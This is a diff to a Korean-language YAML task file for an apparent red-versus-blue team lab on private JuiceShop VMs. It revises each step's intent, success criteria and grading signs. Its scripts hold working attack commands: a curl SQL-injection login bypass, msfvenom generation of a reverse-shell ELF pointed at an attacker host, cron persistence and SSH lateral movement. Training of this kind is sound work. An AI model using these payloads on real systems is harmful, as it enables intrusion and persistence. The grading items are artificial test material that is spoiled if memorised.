@@ -37,20 +37,21 @@ steps:
     type: output_contains
     expect: OPORDER
     semantic:
-      intent: '[RED] 레드팀 vs 블루팀 실전 공방전 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] OpOrder 작전 계획 /tmp/red_opord.md — Operation Objective (구체 목표: JuiceShop admin 접근·DB
+        dump) + Scope (허용 IP 10.20.30.0/24·제외 자산) + Rules of Engagement (허용 기법·파괴 금지·time window·escalation)
+        + Timeline (T+0 Recon T+30 Initial T+60 Lateral T+90 Exfil). 실전 Red Team 운영 문서 형식'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - /tmp/red_opord.md 파일
+      - Objective + Scope + RoE + Timeline 4요소
+      - 실전 Red Team 문서 포맷
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + OpOrder 5-paragraph 포맷
+      - 군사 5-paragraph order 참조 (SMEAC)
+      - NIST SP 800-115 Pentest 가이드
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 4요소 미흡
+      - RoE 없음
+      - 실전 포맷 아님
   target_vm: attacker
   script: 'echo ''=== RED TEAM OPORDER ==='' && echo ''Op: CRIMSON TIDE | Target: 10.20.30.0/24 | Objective:
     Full kill chain'' && echo ''RoE: No DoS, No data destruction, Scope: 10.20.30.0/24 only'' && echo
@@ -74,20 +75,21 @@ steps:
     type: output_contains
     expect: Phase 1
     semantic:
-      intent: '[RED] 레드팀 vs 블루팀 실전 공방전 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] Phase 1 초기 침투 — curl POST /rest/user/login SQLi 로 JuiceShop admin JWT 획득 + nikto
+        -h http://<web>:3000 -maxtime 60 로 추가 취약점 6,700+ 항목 검사. SQLi 성공 시 API 접근 확보 + Nikto 로 병행 추가 벡터
+        탐색. 초기 침투의 complete 모델'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - JuiceShop SQLi + Nikto 두 벡터
+      - JWT 획득 + Nikto 결과
+      - Initial Access 완전성
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - curl SQLi + nikto 병행
+      - sqlmap + burp active scan
+      - OpenVAS + SQLi
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - SQLi 또는 Nikto 한쪽만
+      - JWT 미획득
+      - 후속 연결 없음
   target_vm: attacker
   script: 'echo ''=== Phase 1: Initial Access ==='' && curl -s -X POST http://10.20.30.80:3000/rest/user/login
     -H ''Content-Type: application/json'' -d ''{"email":"\" OR 1=1--","password":"x"}'' | python3 -m json.tool
@@ -115,20 +117,23 @@ steps:
     type: output_contains
     expect: Lateral movement
     semantic:
-      intent: '[RED] 레드팀 vs 블루팀 실전 공방전 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] Phase 2 Persistence + Lateral Movement — msfvenom -p linux/x64/shell_reverse_tcp
+        -f elf -o /tmp/p14.elf (저장만) + (crontab -l; echo * * * * * echo PERSIST_TEST >> /tmp/.p14) | crontab
+        - + ssh ccc@secu whoami && ssh ccc@web hostname (측면 이동). Phase 1 성공 후 자연스러운 확장. Persistence +
+        Lateral combo 전형적 APT 패턴'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - msfvenom payload 생성 (실행 없음)
+      - crontab persistence
+      - ssh 측면 이동 2호스트
+      - APT 확장 패턴
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - msfvenom + crontab + ssh 중첩
+      - systemd service 대체
+      - SSH ProxyJump -J
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 1종 기법만
+      - 실제 payload 실행
+      - 측면 이동 없음
   target_vm: attacker
   script: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/battle_payload.elf
     2>&1 | tail -2 && echo "*/10 * * * * echo BATTLE_BEACON > /tmp/battle_beacon.txt" | crontab - && echo
@@ -161,20 +166,22 @@ steps:
     type: output_contains
     expect: BLUE TEAM LIVE RESPONSE
     semantic:
-      intent: '[BLUE] 레드팀 vs 블루팀 실전 공방전 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] 실시간 Red 탐지 — tail -f /var/log/suricata/fast.log (SQLi + nmap/nikto 경보) + tail /var/log/auth.log
+        (SSH 내부→내부) + diff <(crontab -l) /tmp/crontab_pre_w14 (crontab 변경). 3 소스 실시간 감시로 Red Phase 1+2
+        동시 탐지 시도. MTTD 측정'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - 3 소스 실시간 tail + diff
+      - s2-s3 공격 실시간 포착 시도
+      - MTTD 측정 목적
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - tmux + 3 패널 tail
+      - multitail
+      - Wazuh 통합 뷰
+      - Kibana Discover 실시간
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 정적 분석만 (실시간 아님)
+      - 1-2 소스만
+      - MTTD 개념 없음
   target_vm: secu
   script: 'echo "=== BLUE TEAM LIVE RESPONSE ===" && echo "[1] Suricata alerts:" && ssh 10.20.30.1 "tail
     -20 /var/log/suricata/eve.json 2>/dev/null | python3 -c \"import sys,json; [print(json.loads(l).get(''alert'',{}).get(''signature'',''))
@@ -209,20 +216,21 @@ steps:
     type: output_contains
     expect: Battle Timeline
     semantic:
-      intent: '[BLUE] 레드팀 vs 블루팀 실전 공방전 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] Red 공격 타임라인 재구성 /tmp/red_timeline.txt — 각 Red 행동을 시작/종료 시각 + 탐지 여부 + 탐지 시점 지연(lag)
+        + MTTD 계산. Phase 1 (T+0 Recon·T+5 SQLi·T+10 JWT) + Phase 2 (T+15 persistence·T+20 lateral). 각
+        단계마다 Blue 탐지 성공/실패 evaluation. 사후 복기용'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - /tmp/red_timeline.txt 타임라인
+      - 각 Phase + 시각 + 탐지 성공/실패
+      - lag(지연) + MTTD 계산
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 타임라인 표
+      - timesketch 도구
+      - Splunk timechart
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 시각 없음
+      - 탐지 결과 없음
+      - lag 계산 없음
   target_vm: siem
   script: 'cat > /tmp/battle_timeline.txt << ''EOF'' === Battle Timeline: CRIMSON TIDE ===
 
@@ -262,20 +270,22 @@ steps:
     type: output_contains
     expect: Battle Scorecard
     semantic:
-      intent: '[RED/BLUE] 레드팀 vs 블루팀 실전 공방전 통합 — Phase 전환 또는 종합 보고서·환경 정리'
+      intent: '[RED/BLUE] 공방전 스코어카드 /tmp/scorecard.md — Red 성과 지표 (목표 달성률 %·성공 TTP 수·Dwell Time·발견 취약점
+        수) + Blue 성과 지표 (탐지율·오탐률·MTTD·MTTR·자동 차단 건수) + 종합 점수 (Red vs Blue). 정량 비교로 승패 판정. Live Fire Exercise
+        표준 평가 방식'
       success_criteria:
-      - RED/BLUE 양쪽 산출물 모두 포함 또는 정리
-      - 보고서 파일 저장 또는 markdown 출력
-      - MITRE ATT&CK 매핑 + 개선 권고
+      - /tmp/scorecard.md 파일
+      - Red + Blue 각 4 지표 이상
+      - 정량 비교 표
+      - Live Fire 평가 방식
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 비교표
+      - MITRE ATT&CK Evaluations 방식
+      - Scythe platform scorecard
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 정성 평가만
+      - 지표 3개 이하
+      - 정량 비교 없음
   target_vm: attacker
   script: 'cat > /tmp/battle_scorecard.txt << ''EOF'' === Battle Scorecard: CRIMSON TIDE ===
 
@@ -313,20 +323,21 @@ steps:
     type: output_contains
     expect: Vulnerability Findings
     semantic:
-      intent: '[RED/BLUE] 레드팀 vs 블루팀 실전 공방전 통합 — Phase 전환 또는 종합 보고서·환경 정리'
+      intent: '[RED/BLUE] 취약점 CVSS 분류 /tmp/vuln_cvss.md — 실전 공방전에서 발견된 취약점 목록: SQLi (CVSS 9.8 Critical
+        AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) + Cred Reuse SSH (8.1) + Persistence via cron (6.7) + IDOR
+        등 각각 CVSS 3.1 vector string + OWASP Top 10 매핑 + 즉시/단기/중기 우선순위. CVE 후보 여부'
       success_criteria:
-      - RED/BLUE 양쪽 산출물 모두 포함 또는 정리
-      - 보고서 파일 저장 또는 markdown 출력
-      - MITRE ATT&CK 매핑 + 개선 권고
+      - /tmp/vuln_cvss.md 파일
+      - CVSS 3.1 vector string 최소 5개 취약점
+      - OWASP 매핑 + 우선순위
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - nvd.nist.gov calculator
+      - FIRST CVSS spec 참조
+      - cvss-py 라이브러리
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - vector string 없이 점수만
+      - OWASP 매핑 없음
+      - 우선순위 없음
   target_vm: attacker
   script: 'cat > /tmp/battle_findings.txt << ''EOF'' === Vulnerability Findings ===
 
@@ -370,20 +381,22 @@ steps:
     type: output_contains
     expect: BATTLE REPORT
     semantic:
-      intent: '[RED/BLUE] 레드팀 vs 블루팀 실전 공방전 통합 — Phase 전환 또는 종합 보고서·환경 정리'
+      intent: '[RED/BLUE] 공방전 최종 보고서 /tmp/battle_final_report.md — Executive Summary (비기술 경영진 1쪽: 전체 위험·핵심
+        발견·투자 권고) + Technical Details (재현 절차 PoC·CVSS·탐지 Gap·룰 변경 diff·MITRE ATT&CK Navigator layer) 2부
+        구조. 환경 정리 (crontab -r + payload rm + cookie 삭제)'
       success_criteria:
-      - RED/BLUE 양쪽 산출물 모두 포함 또는 정리
-      - 보고서 파일 저장 또는 markdown 출력
-      - MITRE ATT&CK 매핑 + 개선 권고
+      - /tmp/battle_final_report.md 파일
+      - Executive Summary + Technical 2부 구조
+      - 경영진 1쪽 + 기술 상세
+      - 정리 수행
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 2부 구조
+      - Offensive Security OSCP 보고서 템플릿
+      - SANS DFIR 보고서
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 2부 구조 없음
+      - Executive 없이 기술만
+      - 정리 누락
   target_vm: attacker
   script: 'crontab -r 2>/dev/null; rm -f /tmp/battle_*.elf /tmp/battle_*.txt /tmp/battle_beacon.txt /tmp/battle_nikto.txt
     2>/dev/null && cat > /tmp/battle_final_report.txt << ''EOF'' === RED vs BLUE BATTLE REPORT === Operation:
